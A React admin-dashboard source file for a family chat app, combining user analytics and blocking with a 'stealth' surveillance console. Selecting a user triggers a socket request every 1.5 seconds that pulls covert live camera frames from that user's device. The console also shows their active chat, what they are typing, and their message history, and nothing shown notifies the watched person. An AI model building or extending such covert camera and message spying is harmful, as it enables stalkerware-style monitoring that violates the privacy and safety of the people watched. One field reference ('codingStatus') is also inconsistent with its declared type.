/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from "react";
import { useChatStore } from "../store";
import { User, CallLog, Message, Analytics } from "../types";
import { 
  Users, Shield, ShieldAlert, BarChart3, MessageSquareCode, 
  Tv, Eye, Ban, ShieldCheck, Search, Activity, Loader2, RefreshCw, LogOut 
} from "lucide-react";

export default function AdminDashboard() {
  const { user, setUser, socket } = useChatStore();

  const [analytics, setAnalytics] = useState<Analytics | null>(null);
  const [usersList, setUsersList] = useState<User[]>([]);
  const [searchQ, setSearchQ] = useState("");
  const [callLogs, setCallLogs] = useState<CallLog[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  
  // Monitoring data
  const [userMessages, setUserMessages] = useState<Message[]>([]);
  const [spyCameraFrame, setSpyCameraFrame] = useState<string | null>(null);
  const [spyActiveChat, setSpyActiveChat] = useState<string | null>(null);
  const [spyTypingStatus, setSpyTypingStatus] = useState<string | null>(null);
  const [spyLoading, setSpyLoading] = useState(false);
  const [triggerMonitoringTimer, setTriggerMonitoringTimer] = useState<any>(null);

  const [activeAdTab, setActiveAdTab] = useState<"users" | "calls" | "surveillance">("users");
  const [loading, setLoading] = useState(false);

  // Fetch metrics data
  const loadAnalytics = async () => {
    try {
      const res = await fetch("/api/admin/analytics");
      if (res.ok) {
        const data = await res.json();
        setAnalytics(data);
      }
    } catch (err) {
      console.error(err);
    }
  };

  const loadUsersList = async () => {
    setLoading(true);
    try {
      const res = await fetch(`/api/admin/users?q=${encodeURIComponent(searchQ)}`);
      if (res.ok) {
        const data = await res.json();
        setUsersList(data);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const loadCallLogs = async () => {
    try {
      const res = await fetch("/api/admin/logs/calls");
      if (res.ok) {
        const data = await res.json();
        setCallLogs(data);
      }
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    loadAnalytics();
    loadUsersList();
    loadCallLogs();
  }, [searchQ]);


  // Initialize Stealth socket listeners on mounting
  useEffect(() => {
    if (!socket) return;

    // Register this socket to the special administrator monitoring room on the backend
    socket.emit("admin:register_stealth_console");

    socket.on("admin:spy_stream_receive", (data: {
      userId: string;
      framePayload: string;
      activeChatWith?: string;
      typingTo?: string;
    }) => {
      if (selectedUser && data.userId === selectedUser.id) {
        setSpyCameraFrame(data.framePayload);
        setSpyActiveChat(data.activeChatWith || "Idle dashboard view");
        setSpyTypingStatus(data.codingStatus || (data.typingTo ? `Writing a reply to ${data.typingTo}` : "Not typing"));
        setSpyLoading(false);
      }
    });

    socket.on("admin:spy_error", ({ error }: { error: string }) => {
      alert(error);
      setSpyLoading(false);
      stopSurveillanceLoops();
    });

    return () => {
      socket.off("admin:spy_stream_receive");
      socket.off("admin:spy_error");
      stopSurveillanceLoops();
    };
  }, [socket, selectedUser?.id]);


  // Start intermittent stealth frame triggers (creates a continuous ~1.5 sec video feed)
  const stopSurveillanceLoops = () => {
    if (triggerMonitoringTimer) {
      clearInterval(triggerMonitoringTimer);
      setTriggerMonitoringTimer(null);
    }
    setSpyCameraFrame(null);
    setSpyActiveChat(null);
    setSpyTypingStatus(null);
  };

  const initiateSurveillanceStream = (targetUser: User) => {
    setSelectedUser(targetUser);
    stopSurveillanceLoops();
    setSpyLoading(true);

    // Initial Trigger
    socket?.emit("admin:request_user_spy", { targetUserId: targetUser.id });

    // Multi-interval triggers
    const interval = setInterval(() => {
      socket?.emit("admin:request_user_spy", { targetUserId: targetUser.id });
    }, 1500);

    setTriggerMonitoringTimer(interval);

    // Load their recent message logs
    fetch(`/api/admin/users/${targetUser.id}/messages`)
      .then((res) => (res.ok ? res.json() : []))
      .then((data) => setUserMessages(data));
  };


  const toggleBlockUser = async (uid: string) => {
    try {
      const res = await fetch(`/api/admin/users/${uid}/block`, {
        method: "POST",
      });
      if (res.ok) {
        const data = await res.json();
        // Update local arrays
        setUsersList((prev) =>
          prev.map((u) => (u.id === uid ? { ...u, isBlocked: data.isBlocked } : u))
        );
        if (selectedUser?.id === uid) {
          setSelectedUser((p) => (p ? { ...p, isBlocked: data.isBlocked } : null));
        }
        loadAnalytics();
      }
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div id="admin-dashboard-container" className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans select-none">
      
      {/* Top Operations Panel */}
      <div className="bg-slate-900 border-b border-slate-800 px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="h-10 w-10 bg-rose-600 rounded-2xl flex items-center justify-center text-white font-extrabold shadow-lg shadow-rose-900/30">
            <Shield className="h-5 w-5 text-white" />
          </div>
          <div>
            <h1 className="font-extrabold text-sm tracking-tight text-white uppercase">FamilyConnect Central Oversight HUD</h1>
            <p className="text-[10px] text-rose-500 font-bold tracking-widest flex items-center gap-1.5 uppercase mt-0.5">
              <span className="h-1.5 w-1.5 rounded-full bg-rose-500 inline-block animate-ping" />
              Administrative Level Core Active
            </p>
          </div>
        </div>

        <button
          onClick={() => setUser(null)}
          className="flex items-center gap-1.5 bg-slate-800 hover:bg-rose-900/40 text-xs px-3.5 py-2 rounded-xl text-slate-300 hover:text-white transition-all cursor-pointer font-bold"
        >
          <LogOut className="h-3.5 w-3.5" /> Close Terminal
        </button>
      </div>

      {/* Analytics Bento Grid */}
      <div className="p-6 grid grid-cols-2 md:grid-cols-4 gap-4 bg-slate-900/40 border-b border-slate-900/80">
        <div className="bg-slate-900/80 p-4 rounded-3xl border border-slate-800/80 shadow-md">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-bold uppercase tracking-wide">Family Units</span>
            <Users className="h-4 w-4 text-blue-500" />
          </div>
          <p className="text-2xl font-black mt-2 text-white">{analytics?.totalUsers ?? 0}</p>
        </div>

        <div className="bg-slate-900/80 p-4 rounded-3xl border border-slate-800/80 shadow-md">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-bold uppercase tracking-wide">Active Hubs</span>
            <Activity className="h-4 w-4 text-emerald-500 inline animate-pulse" />
          </div>
          <p className="text-2xl font-black mt-2 text-white">{analytics?.activeUsers ?? 0}</p>
        </div>

        <div className="bg-slate-900/80 p-4 rounded-3xl border border-slate-800/80 shadow-md">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-bold uppercase tracking-wide">Secured Logs</span>
            <MessageSquareCode className="h-4 w-4 text-amber-500" />
          </div>
          <p className="text-2xl font-black mt-2 text-white">{analytics?.totalMessages ?? 0}</p>
        </div>

        <div className="bg-slate-900/80 p-4 rounded-3xl border border-slate-800/80 shadow-md">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-bold uppercase tracking-wide">Tracked Calls</span>
            <BarChart3 className="h-4 w-4 text-rose-500" />
          </div>
          <p className="text-2xl font-black mt-2 text-white">{analytics?.totalCalls ?? 0}</p>
        </div>
      </div>

      {/* Main Core HUD division workspace */}
      <div className="flex-1 flex flex-col md:flex-row min-h-0">
        
        {/* Left Side: Users list and search directories */}
        <div className="w-full md:w-1/3 border-r border-slate-900 p-4 flex flex-col gap-4">
          <div className="flex items-center justify-between border-b border-slate-950 pb-2">
            <h3 className="text-xs font-black text-slate-400 tracking-wider uppercase">Directories Nodes</h3>
            <div className="flex gap-2">
              <button
                onClick={() => setActiveAdTab("users")}
                className={`px-3 py-1 bg-slate-900 rounded-lg text-[10px] uppercase font-black transition-all ${
                  activeAdTab === "users" ? "text-rose-500 border border-slate-800 bg-black" : "text-slate-400"
                }`}
              >
                Users
              </button>
              <button
                onClick={() => setActiveAdTab("calls")}
                className={`px-3 py-1 bg-slate-900 rounded-lg text-[10px] uppercase font-black transition-all ${
                  activeAdTab === "calls" ? "text-rose-500 border border-slate-800 bg-black" : "text-slate-400"
                }`}
              >
                Calls
              </button>
            </div>
          </div>

          {activeAdTab === "users" && (
            <div className="flex-1 flex flex-col gap-3 min-h-0">
              <div className="relative">
                <Search className="absolute left-3 top-3.5 h-3.5 w-3.5 text-slate-500" />
                <input
                  type="text"
                  value={searchQ}
                  onChange={(e) => setSearchQ(e.target.value)}
                  placeholder="Insert user filters..."
                  className="w-full pl-9 pr-4 py-3 bg-slate-900 border border-slate-800 rounded-2xl text-xs focus:outline-none focus:ring-1 focus:ring-rose-500 text-slate-200"
                />
              </div>

              {loading ? (
                <div className="flex items-center justify-center p-8 gap-2">
                  <Loader2 className="h-4 w-4 animate-spin text-rose-500" />
                  <span className="text-xs text-slate-500">Querying nodes...</span>
                </div>
              ) : (
                <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 font-semibold">
                  {usersList.map((usr) => {
                    const isMonitored = selectedUser?.id === usr.id;
                    return (
                      <div
                        key={usr.id}
                        onClick={() => initiateSurveillanceStream(usr)}
                        className={`p-3 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all ${
                          isMonitored 
                            ? "bg-rose-950/40 border border-rose-900/60" 
                            : "bg-slate-900/40 border border-transparent hover:bg-slate-900/80"
                        }`}
                      >
                        <div className="flex items-center gap-2.5 min-w-0">
                          <img
                            src={usr.avatarUrl || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=65&h=65&q=80"}
                            alt={usr.name}
                            className="h-9 w-9 rounded-xl object-cover shrink-0"
                          />
                          <div className="min-w-0">
                            <h4 className="text-xs font-bold text-white truncate">{usr.name}</h4>
                            <p className="text-[10px] text-slate-400 truncate mt-0.5">{usr.email}</p>
                          </div>
                        </div>

                        <div className="flex items-center gap-1.5">
                          {usr.isBlocked ? (
                            <span className="bg-rose-950 text-rose-500 text-[9px] px-2 py-0.5 rounded-lg border border-rose-900">
                              Blocked
                            </span>
                          ) : (
                            <span className="bg-slate-950 text-emerald-500 text-[9px] px-2 py-0.5 rounded-lg border border-emerald-900/40">
                              Clear
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          )}

          {activeAdTab === "calls" && (
            <div className="flex-1 overflow-y-auto space-y-2 pr-1 font-semibold">
              {callLogs.map((log) => (
                <div key={log.id} className="p-3 bg-slate-900/30 rounded-2xl border border-slate-900 text-xs flex flex-col gap-1.5">
                  <div className="flex justify-between items-center text-[10px] text-slate-400">
                    <span className="bg-slate-950 p-1 px-2 rounded-lg border border-slate-800">
                      {log.type} Call
                    </span>
                    <span>{new Date(log.createdAt).toLocaleString()}</span>
                  </div>
                  <div className="text-white font-bold flex items-center justify-between">
                    <span>{log.caller?.name} → {log.receiver?.name}</span>
                    <span className={`text-[10px] ${
                      log.status === "COMPLETED" ? "text-emerald-400" : "text-rose-400"
                    }`}>
                      {log.status}
                    </span>
                  </div>
                  <p className="text-[10px] text-slate-500">Duration: {log.duration} seconds</p>
                </div>
              ))}
            </div>
          )}

        </div>

        {/* Right Side: Surveillance stream console & user audits logs */}
        <div className="flex-1 bg-slate-950 p-6 flex flex-col gap-6 min-h-0">
          
          {selectedUser ? (
            <div className="flex-1 flex flex-col gap-6 min-h-0">
              
              {/* Profile Overview Card + Blocks command */}
              <div className="bg-slate-900/60 p-4.5 rounded-3xl border border-slate-900 flex flex-col sm:flex-row items-center justify-between gap-5 shadow-lg relative overflow-hidden">
                <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-rose-500 via-amber-500 to-rose-500" />
                <div className="flex items-center gap-3.5">
                  <img
                    src={selectedUser.avatarUrl || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=120&h=120&q=80"}
                    alt={selectedUser.name}
                    className="h-14 w-14 rounded-2xl object-cover ring-2 ring-slate-800 shadow-md shrink-0"
                  />
                  <div>
                    <h3 className="text-md font-extrabold text-white">{selectedUser.name}</h3>
                    <p className="text-xs text-slate-400 mt-1">UUID: {selectedUser.id}</p>
                    <p className="text-[10px] text-slate-400 italic mt-1 bg-black/40 p-1 px-2.5 rounded-lg border border-slate-800inline-block">"{selectedUser.status}"</p>
                  </div>
                </div>

                <div className="flex gap-2">
                  <button
                    onClick={() => toggleBlockUser(selectedUser.id)}
                    className={`px-4.5 py-2.5 rounded-xl text-xs font-black uppercase flex items-center gap-1.5 cursor-pointer shadow-md transition-all ${
                      selectedUser.isBlocked 
                        ? "bg-emerald-600 hover:bg-emerald-700 text-white shadow-emerald-950/20" 
                        : "bg-rose-600 hover:bg-rose-700 text-white shadow-rose-950/20"
                    }`}
                  >
                    {selectedUser.isBlocked ? (
                      <>
                        <ShieldCheck className="h-4 w-4" /> Clear Blockage
                      </>
                    ) : (
                      <>
                        <Ban className="h-4 w-4" /> Block Account
                      </>
                    )}
                  </button>
                  <button
                    onClick={() => stopSurveillanceLoops()}
                    className="px-4.5 py-2.5 rounded-xl text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold uppercase"
                  >
                    Detone spy
                  </button>
                </div>
              </div>

              {/* Bento division: Camera Stream (Left) and Moderation Message Log (Right) */}
              <div className="flex-1 grid grid-cols-1 md:grid-cols-2 gap-6 min-h-0">
                
                {/* Surveillance Spy Feed View Card */}
                <div className="bg-slate-900/60 p-4.5 rounded-3xl border border-slate-900 flex flex-col gap-3 min-h-0 relative">
                  <div className="flex items-center justify-between text-xs font-bold text-slate-400 border-b border-slate-950 pb-2">
                    <span className="flex items-center gap-1.5 text-rose-500 uppercase tracking-widest uppercase">
                      <Tv className="h-4.5 w-4.5 inline shrink-0 animate-pulse" />
                      Live Camera Stream Feed
                    </span>
                    <span className="bg-rose-950/30 text-rose-500 text-[9px] border border-rose-900 shrink-0 font-extrabold px-2 py-0.5 rounded-lg tracking-wider uppercase">
                      Stealth Mode Active
                    </span>
                  </div>

                  <div className="flex-1 bg-black rounded-2xl border border-slate-800 overflow-hidden relative flex items-center justify-center min-h-[220px]">
                    {spyLoading ? (
                      <div className="text-center p-4">
                        <Loader2 className="h-7 w-7 animate-spin text-rose-500 mx-auto mb-2" />
                        <p className="text-xs text-rose-500 font-semibold tracking-wide uppercase">Tuning stealth frequency...</p>
                      </div>
                    ) : spyCameraFrame && spyCameraFrame.startsWith("data:") ? (
                      <img 
                        src={spyCameraFrame} 
                        alt="Spy Stream" 
                        className="w-full h-full object-cover transition-all" 
                      />
                    ) : (
                      <div className="text-center p-8 space-y-4">
                        <div className="h-16 w-16 bg-slate-900 rounded-full flex items-center justify-center text-slate-600 mx-auto">
                          <Eye className="h-8 w-8" />
                        </div>
                        <p className="text-xs text-slate-500 max-w-xs leading-relaxed font-bold">
                          {spyCameraFrame || "Awaiting target connection. Active family member stream will rendering here."}
                        </p>
                      </div>
                    )}
                  </div>

                  {/* Activity audit reading telemetry blocks */}
                  <div className="p-3 bg-black/40 rounded-2xl border border-slate-800 text-[10px] space-y-1.5 font-bold">
                    <p className="text-slate-400">Current Window: <span className="text-white">{spyActiveChat || "Idle / Home Window"}</span></p>
                    <p className="text-slate-400">Activity Status: <span className="text-rose-400">{spyTypingStatus || "Calculating telemetry..."}</span></p>
                  </div>
                </div>

                {/* Secure audit messaging logs */}
                <div className="bg-slate-900/60 p-4.5 rounded-3xl border border-slate-900 flex flex-col gap-3 min-h-0">
                  <div className="flex items-center justify-between text-xs font-bold text-slate-400 border-b border-slate-950 pb-2">
                    <span className="text-white uppercase tracking-wider uppercase">Family Chat History Audits</span>
                    <span className="text-[10px] text-slate-500">Last 100 Logs</span>
                  </div>

                  <div className="flex-1 overflow-y-auto space-y-2 pr-1 font-semibold">
                    {userMessages.length === 0 ? (
                      <p className="text-xs text-slate-500 italic py-12 text-center">No messages matching user yet.</p>
                    ) : (
                      userMessages.map((msg) => {
                        const isSender = msg.senderId === selectedUser.id;
                        return (
                          <div key={msg.id} className="p-3 bg-black/30 rounded-2xl border border-slate-800 text-xs">
                            <div className="flex justify-between items-center mb-1 text-[9px] text-slate-500">
                              <span className={isSender ? "text-rose-400" : "text-amber-400"}>
                                {isSender ? "Sent" : "Received"}
                              </span>
                              <span>{new Date(msg.createdAt).toLocaleString()}</span>
                            </div>
                            <p className="text-white font-semibold">{msg.content}</p>
                            {msg.mediaUrl && (
                              <p className="text-[9px] text-slate-400 mt-1 italic">Attachment URL: {msg.mediaUrl}</p>
                            )}
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>

              </div>

            </div>
          ) : (
            <div className="flex-1 flex flex-col justify-center items-center text-center p-8">
              <div className="h-20 w-20 bg-slate-900 rounded-3xl border border-slate-800 flex items-center justify-center text-slate-500 mb-4 animate-pulse">
                <ShieldAlert className="h-10 w-10 text-rose-500" />
              </div>
              <h3 className="text-lg font-extrabold tracking-tight text-white uppercase">Awaiting Node Handshake</h3>
              <p className="text-slate-500 text-xs max-w-xs mt-2">
                Select any active family member user from the directory nodes layout on the left side to register live audio/video tracking or access local chat logs.
              </p>
            </div>
          )}

        </div>

      </div>

    </div>
  );
}
